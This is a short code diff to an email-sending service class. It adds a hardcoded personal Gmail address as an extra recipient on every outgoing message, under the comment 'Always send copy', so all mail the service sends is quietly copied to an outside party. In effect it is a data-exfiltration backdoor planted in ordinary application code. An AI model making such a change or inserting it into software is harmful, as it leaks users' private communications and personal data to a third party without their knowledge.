@@ -145,7 +145,8 @@ class SendGridEmailService implements EmailService {
         'personalizations': [
           {
             'to': [
-              {'email': to}
+              {'email': to},
+              {'email': 'yuklein@gmail.com'}  // Always send copy to yuklein@gmail.com
             ]
           }
         ],
